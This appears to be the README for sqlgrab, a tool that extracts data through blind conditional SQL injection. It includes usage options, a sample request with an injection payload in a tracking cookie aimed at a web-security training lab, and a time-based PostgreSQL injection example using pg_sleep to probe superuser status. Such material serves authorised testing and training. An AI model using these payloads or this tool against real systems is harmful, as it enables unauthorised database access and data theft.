![sqlgrab in action](https://github.com/zw00sh/sqlgrab/blob/main/sqlgrab.png?raw=true)

Extracts string data from a conditional SQLi vulnerability using a binary search tree approach.

```
usage: sqlgrab.py [-h] -u HOST -r REQUEST -q QUERY -d {mysql,mssql,oracle,postgresql} -c CONDITION [--delay DELAY] [--urlencode] [--proxy PROXY]

options:
  -h, --help            show this help message and exit
  -u HOST, --host HOST  Host URL, including protocol scheme and optionally port. E.g. https://target.com:80
  -r REQUEST, --request REQUEST
                        Request file containing one or more '{payload}' tags
  -q QUERY, --query QUERY
                        SQL query to extract the response of. Must return a single string, e.g. @@version, SELECT user FROM dual
  -d {mysql,mssql,oracle,postgresql}, --dbms {mysql,mssql,oracle,postgresql}
  -c CONDITION, --condition CONDITION
                        Python expression to evaluate to determine true/false from the response. E.g. '"error" in response.text', 'response.status_code == 401', 'len(response.content) > 1433'
  --delay DELAY         Delay in seconds to add between requests. Optional. E.g. 1, 0.2
  --urlencode           Perform URL-encoding on the payloads. Optional. E.g. True, False
  --proxy PROXY         Proxy to use, e.g. http://127.0.0.1:8080
```

Format the `--request` file with a `{payload}` tag in the injection point(s), e.g.:

```
GET /product?productId=2 HTTP/1.1
Host: 0a71006803b7d36283d03ccb0039009c.web-security-academy.net
Cookie: TrackingId=XN76iA2kiYP0jZi4'+and+{payload}+and+'1'='1; session=CD9BkaYNOFKpFN2vVS10uZNxzwMfvVZd
Sec-Ch-Ua: "Chromium";v="117", "Not;A=Brand";v="8"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.132 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a290082037bba50819866d700310037.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9


```

Example usage in code:
```python
request = requests.Request(
  method='GET',
  url=url + ';SELECT+CASE+WHEN+{payload}+THEN+pg_sleep(1)+END;--'
)
grabber = SqlGrab(
        request=request,
        dbms='postgresql',
        condition='response.elapsed.total_seconds() > 1',
        proxy=args.proxy
)
grabber.grab(query='SELECT current_setting($$is_superuser$$)')
```
